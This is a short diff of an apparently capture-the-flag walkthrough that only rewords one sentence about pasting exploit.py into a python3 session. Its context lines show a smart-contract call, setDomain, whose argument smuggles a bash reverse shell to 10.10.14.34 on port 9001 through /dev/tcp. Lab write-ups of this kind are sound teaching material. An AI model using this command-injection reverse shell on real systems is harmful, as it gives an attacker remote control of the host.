@@ -611,7 +611,7 @@ Along with my `tcpdump` in order to first verify that I could receive a connecti
 contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact()
 ```
 
-I did not run the exploit directly with `python` either. Instead, I ran `python3` and then copy and pasted everything contained in `exploit.py` and did it all manually. I'm sure there is a way to autopwn the first hurdle, but I haven't taken the time to write anything for it so far.
+I did not run the exploit directly with `python` either. Instead, I ran `python3` and then copy and pasted everything contained in `exploit.py` and ran it all manually. I'm sure there is a way to autopwn the first hurdle, but I haven't taken the time to write anything for it so far.
 
 <p><br></p>
 
